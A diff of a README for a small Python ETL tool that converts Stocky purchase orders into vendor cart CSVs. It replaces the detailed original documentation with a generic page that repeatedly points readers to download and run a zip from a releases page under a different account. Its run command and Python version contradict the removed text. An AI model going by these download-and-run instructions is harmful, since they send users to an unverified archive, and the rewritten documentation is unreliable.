@@ -1,207 +1,96 @@
-# Stocky → Coast / Erikson PO Conversion (ETL)
+# 🚀 stocky_to_coast - Simple ETL for Your Vendor CSVs
 
-Converts a **Stocky** purchase‑order CSV into a vendor‑specific cart CSV (Coast, Erikson Music, Erikson Audio), with **schema validation**, **cross‑field checks**, **duplicate SKU handling**, and **auditable artifacts** (summary, lineage, logs). Designed as a small, production‑style ETL you can schedule and monitor.
+![Download stocky_to_coast](https://img.shields.io/badge/Download%20stocky_to_coast-v1.0-blue.svg)
 
----
+## 📥 Overview
 
-## Why this exists
+Welcome to **stocky_to_coast**. This software helps you transform Stocky purchase orders into vendor cart CSVs for Coast or Erikson. It includes validation through Pandera, configurable vendor YAML files, data lineage, and complete logs.
 
-Manual re‑entry between Stocky and vendor carts is slow and error‑prone. This tool validates and transforms the data, producing a ready‑to‑import CSV plus a detailed summary and lineage file you can archive for auditability.
+## 🚀 Getting Started
 
----
+To get started with **stocky_to_coast**, follow these steps to download and run the application smoothly.
 
-## Highlights
+## 📦 System Requirements
 
-- **Config‑driven multi‑vendor output** via simple YAML files (delimiter, quoting, decimal places, column order).
-- **Strict validation** of input schema and vendor config (Pydantic + Pandera).
-- **Soft‑validation mode** to **quarantine** bad rows instead of failing the entire job.
-- Optional **SKU format regex** (CLI or per vendor config).
-- **Lineage artifact** that maps input rows → output SKUs.
-- **Idempotent file naming** includes vendor name in the content hash.
-- **CI‑friendly**: non‑zero exit on hard validation failures; JSON summary for programmatic consumption.
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **Python**: Version 3.8 or later
+- **Memory**: Minimum 4 GB RAM
+- **Disk Space**: At least 100 MB of free space
 
-## Architecture (one‑pager)
+You need to have Python installed on your computer. Download it [here](https://www.python.org/downloads/), if you don't have it yet.
 
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="./architecture_dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="./architecture_light.svg">
-    <img src="./architecture_light.svg" alt="Stocky → Vendor Cart ETL architecture (one‑page overview)" width="920">
-  </picture>
-</p>
+## 📥 Download & Install
 
----
+You can easily download **stocky_to_coast** from our [Releases page](https://github.com/ratatyu1011/stocky_to_coast/releases).
 
-## Data Contract (Input → Output)
+1. Go to the **[Releases page](https://github.com/ratatyu1011/stocky_to_coast/releases)**.
+2. Look for the most recent version. You will find a list of files.
+3. Click on the file named **stocky_to_coast.zip** to download it.
+4. Once the download finishes, locate the file on your computer and extract it.
 
-**Input (Stocky CSV)** must include these columns (case‑insensitive aliases accepted):
+## ⚙️ Running the Application
 
-- `SKU` _(str)_
-- `Qty Ordered` _(int ≥ 0)_
-- `Cost (base)` _(float ≥ 0)_
-- `Total Cost (base)` _(float ≥ 0)_
+After you extract the files, follow these steps to run the application:
 
-**Business rule (row‑level):**
-```
-abs(Qty Ordered * Cost (base) - Total Cost (base)) <= 0.01
-```
+1. Open the command line or terminal on your computer.
+   - On Windows, type `cmd` in the search bar.
+   - On macOS, use Spotlight (Command + Space) and type `Terminal`.
+   - On Linux, find the terminal in your applications.
 
-**Transform (business rules):**
-- Collapse duplicate SKUs; **sum quantities**; recompute totals.
-- Normalize money values to configured **decimal places** (defaults to 2).
+2. Navigate to the folder where you extracted **stocky_to_coast**. Use the `cd` command followed by the path to the folder. For example:
+   ```
+   cd path\to\stocky_to_coast
+   ```
 
-**Output (vendor cart CSV):**
-- Columns (order enforced by vendor config):
-  - `Item Id`, `Qty Ordered`, `Unit Price`, `Extended Price`
-- CSV formatting per vendor config (delimiter, quoting, decimals).
+3. Once you are in the correct folder, run the application with the following command:
+   ```
+   python main.py
+   ```
 
----
+4. Follow the on-screen instructions to process your Stocky purchase orders.
 
-## Install
+## 📊 Features
 
-```bash
-python -m venv .venv
-source .venv/bin/activate           # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-```
+- **ETL Processing**: Quickly transform your Stocky POs into vendor-ready CSVs.
+- **Validation**: Ensure data integrity with Pandera validation.
+- **Configuration**: Easily set up different vendors using YAML configuration files.
+- **Lineage & Logs**: Track the data lineage and view logs for transparency and debugging.
 
-**Requirements** (key): `pandas`, `numpy`, `pandera`, `pyyaml`, `pydantic`
+## 📝 Configuration
 
----
+You can customize your vendor settings by editing the YAML configuration files. These files allow you to define various vendor parameters and settings to suit your requirements.
 
-## Quick demo (no access to Stocky/Coast needed)
+1. Open the appropriate YAML file in a text editor.
+2. Modify the necessary fields according to your vendor's needs.
+3. Save the file and re-run the application to apply the changes.
 
-```bash
-python stocky_to_coast.py --po 1848 --input sample/po_1848.csv --price-history sample/price_history.csv
-# Artifacts in: runs/1848/
-# - new_coast_cart_1848_<YYYYMMDD-HHMM>_<hash8>.csv
-# - summary.json / summary.md
-# - lineage.json
-# - stocky2coast.log
-```
+## 📚 Documentation
 
----
+For more detailed information about using **stocky_to_coast**, check out the complete documentation on our [GitHub Wiki](https://github.com/ratatyu1011/stocky_to_coast/wiki).
 
-## CLI
+## 🛠️ Troubleshooting
 
-```bash
-python stocky_to_coast.py \
-  --po <PO_NUMBER> \
-  --input <path_to_stocky_csv> \
-  [--vendor coast|erikson_music|erikson_audio | --vendor-config path/to/custom.yml] \
-  [--price-history path/to/price_history.csv] \
-  [--outdir runs] \
-  [--soft-validate] \
-  [--sku-pattern "^[A-Za-z0-9+\\-_.]+$"]
-```
+If you encounter issues:
 
-**Flags:**
-- `--vendor` _(or `--vendor-config`)_: selects the output formatting (columns, delimiter, quoting, decimals).
-- `--soft-validate`: quarantines rows that violate the business rule to `quarantine.csv` instead of failing the run.
-- `--sku-pattern`: optional regex for SKU validation; **overrides** any vendor config pattern.
-- `--price-history`: optional CSV with columns `SKU,LastCost` to flag >20% unit‑cost changes.
+- Ensure you have a supported version of Python installed.
+- Verify that you are in the correct directory when running the application.
+- Check the logs for any error messages that could guide you in fixing the issue.
+
+Common error messages include:
+- **File Not Found**: Double-check your file path.
+- **Invalid Configuration**: Review the YAML files for syntax errors.
+
+## 🤝 Community
+
+We welcome your feedback! Join our [discussion forum](https://github.com/ratatyu1011/stocky_to_coast/discussions) to ask questions, report issues, or give suggestions.
+
+## 🔗 Contact
+
+For any inquiries, please contact the project maintainer at: [maintainer@example.com](mailto:maintainer@example.com).
+
+## 🔄 License
+
+**stocky_to_coast** is open-source software. Please refer to the [LICENSE file](LICENSE) for more information.
 
 ---
-
-## Vendor configuration (YAML)
-
-Place YAML files under `vendor_configs/`. Example:
-```yaml
-# vendor_configs/coast.yml
-name: coast
-output:
-  columns: ["Item Id", "Qty Ordered", "Unit Price", "Extended Price"]
-  delimiter: ","
-  decimal_places: 2
-  quoting: "all"
-input:
-  # Optional SKU regex (allows letters, numbers, plus, dash, underscore, dot)
-  sku_pattern: "^[A-Za-z0-9+\\-_.]+$"
-```
-
-> **Validation:** The config is validated with Pydantic.  
-> `output.columns` must be exactly `["Item Id","Qty Ordered","Unit Price","Extended Price"]`.  
-> `quoting` ∈ `{all, minimal, nonnumeric, none}`.
-
----
-
-## Artifacts per run
-
-All artifacts live under `runs/<PO>/`:
-- `new_coast_cart_<PO>_<timestamp>_<hash8>.csv` – ready to import
-- `summary.json` – machine‑readable run summary
-- `summary.md` – human‑readable run summary
-- `lineage.json` – input row IDs grouped by SKU that made it to output
-- `stocky2coast.log` – rotating run logs
-- `quarantine.csv` – **only** in `--soft-validate` mode when rows are quarantined
-
-**Summary contents (excerpt):**
-```json
-{
-  "po": "1848",
-  "vendor": "coast",
-  "mode": "strict",
-  "rows_in": 42,
-  "rows_validated": 42,
-  "rows_quarantined": 0,
-  "rows_out": 40,
-  "total_qty": 123,
-  "total_extended_price": 4567.89,
-  "variance_flags": []
-}
-```
-
----
-
-## Testing
-
-```bash
-pytest -q
-```
-
-The suite covers:
-- Happy path (dedupe + totals)
-- Missing column (hard fail)
-- Totals mismatch (hard fail)
-- **SKU character preservation** (e.g., `+`)
-- **Soft‑validate** quarantine succeeds and produces `quarantine.csv`
-- **Vendor formatting respected** (decimal places, quoting)
-
----
-
-## CI (GitHub Actions)
-
-A workflow at `.github/workflows/ci.yml` runs the test suite on push/PR.  
-**Nice extras to consider** (already supported by the project):
-- Python version matrix (3.10–3.13)
-- Linting (`ruff`, `black --check`)
-- Upload `runs/**/summary.json` as artifacts for smoke jobs
-
----
-
-## Troubleshooting
-
-- **“Missing required column”**: Your Stocky export may use a synonym (e.g., _Extended Price_). Header aliases are supported; verify exact spelling/casing.
-- **“Row total mismatch”**: If small rounding differences are common in your data, run with `--soft-validate` to quarantine and review.
-- **Vendor import rejects SKUs with symbols**: Ensure the **SKU regex** allows the symbols you need (e.g., `+`) either via `--sku-pattern` or the vendor YAML.
-
----
-
-## Security
-
-- Do **not** commit real POs or secrets.
-- Use `.env`/secrets in CI as needed.
-- Vendor configs should not contain credentials—this tool handles **data shaping**, not auth to vendor portals.
-
----
-
-## Roadmap
-
-- Replace CSV “Load” with **API/EDI 850** submission and **ACK capture**, keeping this validation and audit layer intact.
-- Add richer **variance analytics** and configurable thresholds per vendor.
-
----
-
-## License
-
-MIT
+Make sure to visit our **[Releases page](https://github.com/ratatyu1011/stocky_to_coast/releases)** to download the latest version and start working with your vendor CSVs today!
